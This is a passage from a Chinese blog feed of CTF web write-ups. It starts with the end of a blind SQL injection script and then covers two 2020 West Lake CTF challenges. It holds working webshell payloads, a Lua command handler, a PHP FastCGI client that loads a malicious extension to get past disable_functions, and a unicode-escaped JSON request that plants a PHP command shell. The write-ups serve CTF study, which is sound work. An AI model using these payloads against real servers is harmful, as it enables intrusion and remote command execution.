class="line">CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="string">&#x27;\\_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">CHAR_DICTIONARY2 = ascii_str()</span><br><span class="line"></span><br><span class="line"><span class="comment"># find 用于存储已找到的字符</span></span><br><span class="line">find = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 ascii 作用判断依据更好。</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">30</span>, <span class="number">127</span>):</span><br><span class="line">        pos = len(find) + <span class="number">1</span></span><br><span class="line">        s = <span class="string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span></span><br><span class="line">        <span class="comment"># 使用 ascii 码进行判断（更优）</span></span><br><span class="line">        param = <span class="string">f&quot;ascii(substr((<span class="subst">&#123;s&#125;</span>), <span class="subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 使用 char 进行字符判断。</span></span><br><span class="line">        <span class="comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span></span><br><span class="line">        result = query(param)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            f = <span class="literal">True</span></span><br><span class="line">            find += chr(c)</span><br><span class="line">            print(find)</span><br><span class="line">            print(<span class="string">&#x27;-------------------------&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(find)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考教程：</p><ol><li>你真的了解 IP 吗，PHP 如何严格获取真实用户 IP？：<a href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip">https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip</a></li><li>Bugku INSERT INTO注入(时间盲注）：<a href="https://blog.csdn.net/qq_37873738/article/details/85633897">https://blog.csdn.net/qq_37873738/article/details/85633897</a></li></ol><hr><p>后面的题目以后有时间补补（占坑</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年10月西湖论剑CTF部分web题解</title>
      <link href="f35350be9fcd/"/>
      <url>f35350be9fcd/</url>
      
        <content type="html"><![CDATA[<p>题目质量很高。</p><hr><a id="more"></a><h1 id="NewUpload（php-fpm任意代码执行）"><a href="#NewUpload（php-fpm任意代码执行）" class="headerlink" title="NewUpload（php-fpm任意代码执行）"></a>NewUpload（php-fpm任意代码执行）</h1><ul><li>使用 Burpsuite 进行文件上传一句话，文件名使用换行绕过，上传内容 %00 截断绕过，post 内容使用 base64 加密，不然会被拦截。</li><li>查看 phpinfo 拿到题目较为明显的2个条件：<ol><li>disable_function，过滤了如下函数</li><li>open_basedir限制了如下目录</li></ol></li><li>读取根目录 var_dump(scandir(“/“));发现 flag 文件和 readflag 文件。</li><li>open_basedir 绕过尝试读取 2 个文件，查看flag文件（没有权限）、readflag文件（二进制文件）。</li><li>使用蚁剑连接，方便后面进行利用。</li></ul><p><strong>解法1:宝塔 Apache 默认安装的 lua 模块配合 htaccess 执行系统命令</strong></p><ul><li>编写并上传 .htaccess 文件</li><li>写一个 1.lua 进行命令执行即可拿到 flag{3be9f1618515e751892cef4cf16f820e}</li></ul><p><strong>.htaccess 文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure><p><strong>1.lua</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(r)</span></span></span><br><span class="line">    r.content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    <span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&#x27;/readflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    r:puts(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>( r:parseargs() ) <span class="keyword">do</span></span><br><span class="line">            r:puts( <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s: %s\n&quot;</span>, k, v) )</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r:puts(<span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong>解法3：利用tmp下的php-fpm socket加载扩展（利用蚁剑插件）</strong></p><ul><li>编译并上传 ant.so。</li><li>上传蚁剑的加载拓展脚本 2.php</li><li>上传 s.php 执行函数</li><li>访问 s.php 得到 flag。 </li></ul><p><strong>方便执行代码（自己base64）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://newupload.xhlj.wetolink.com/sandbox/i631kn4rq3skctfkab4d65uhuc/upload/5.php&quot;</span></span><br><span class="line">    resp = session.post(</span><br><span class="line">        url=url,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;pass&#x27;</span>: input()</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    print(resp.text)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> $keepAlive = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">protected</span> $_requests = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> $_requestCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params">$type, $content, $requestId = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $offset = <span class="number">0</span>;</span><br><span class="line">        $totLen = strlen($content);</span><br><span class="line">        $buf    = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// Packets can be a maximum of 65535 bytes</span></span><br><span class="line">            $part = substr($content, $offset, <span class="number">0xffff</span> - <span class="number">8</span>);</span><br><span class="line">            $segLen = strlen($part);</span><br><span class="line">            $buf .= chr(<span class="built_in">self</span>::VERSION_1)        <span class="comment">/* version */</span></span><br><span class="line">                . chr($type)                    <span class="comment">/* type */</span></span><br><span class="line">                . chr(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">                . chr($requestId &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">                . chr(($segLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)    <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">                . chr($segLen &amp; <span class="number">0xFF</span>)           <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">                . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">                . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">                . $part;                        <span class="comment">/* content */</span></span><br><span class="line">            $offset += $segLen;</span><br><span class="line">        &#125; <span class="keyword">while</span> ($offset &lt; $totLen);</span><br><span class="line">        <span class="keyword">return</span> $buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params">$data, $length = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($length === <span class="literal">null</span>) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildAllPacket</span>(<span class="params"><span class="keyword">array</span> $params, $stdin</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Ensure new requestID is not already being tracked</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_requestCounter++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_requestCounter &gt;= <span class="number">65536</span> <span class="comment">/* or (1 &lt;&lt; 16) */</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_requestCounter = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $id = <span class="keyword">$this</span>-&gt;_requestCounter;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_requests[$id]));</span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>), $id);</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= <span class="keyword">$this</span>-&gt;buildNvpair($key, $value, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, $paramsRequest, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>, $id);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, $stdin, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>, $id);</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$sock = stream_socket_client(<span class="string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, $errno, $errstr);</span><br><span class="line">$client = <span class="keyword">new</span> Client();</span><br><span class="line">$payload_file = <span class="string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;</span><br><span class="line">$params = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; $payload_file,</span><br><span class="line">    <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,</span><br><span class="line">    <span class="comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span></span><br><span class="line">);</span><br><span class="line">$data = $client-&gt;buildAllPacket($params, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">fwrite($sock, $data);</span><br><span class="line">var_dump(fread($sock, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>s.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> antsystem(<span class="string">&quot;/readflag&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考教程：</p><ol><li>从一道CTF学习Fastcgi绕过姿势：<a href="https://www.anquanke.com/post/id/186186#h2-4">https://www.anquanke.com/post/id/186186#h2-4</a></li><li>2019 0ctf final Web Writeup（1）：<a href="https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/">https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/</a></li><li>php 自定义恶意扩展 so 编写过程：<a href="https://xz.aliyun.com/t/7330#toc-3">https://xz.aliyun.com/t/7330#toc-3</a></li><li>Fastcgi 协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> </li><li>西湖论剑初赛Web1/5：<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol><hr><h1 id="EasyJson（php-审计）"><a href="#EasyJson（php-审计）" class="headerlink" title="EasyJson（php 审计）"></a>EasyJson（php 审计）</h1><p><strong>基本步骤</strong></p><ul><li>filename=index.php 可过 check</li><li>使用 application/json 类型的 enctype 发送构造好的数据包</li><li>使用 burpsuite 将关键代码转 unicode，发送后得到地址。(不用改 x-Forward-For 也可以)</li><li>执行命令：<br><a href="http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag</a></li><li>得到 flag{a5db5397505f825334aa4dfc17d3bb9f} Powered By Dbapp OSS.</li></ul><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,$_GET[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,$content))&#123;</span><br><span class="line">    $content = json_decode($content);</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;</span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">&quot;reset&quot;</span>)&#123;</span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>数据包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?source&#x3D;1&amp;action&#x3D;write&amp;filename&#x3D;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: easyjson.xhlj.wetolink.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Content-Length: 191</span><br><span class="line"></span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;</span><br></pre></td></tr></table></figure><p>参考教程：</p><ol><li>西湖论剑初赛Web1/5：<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年9月DownUnderCTF</title>
      <link href="cb1f97c7f164/"/>
      <url>cb1f97c7f164/</url>
      
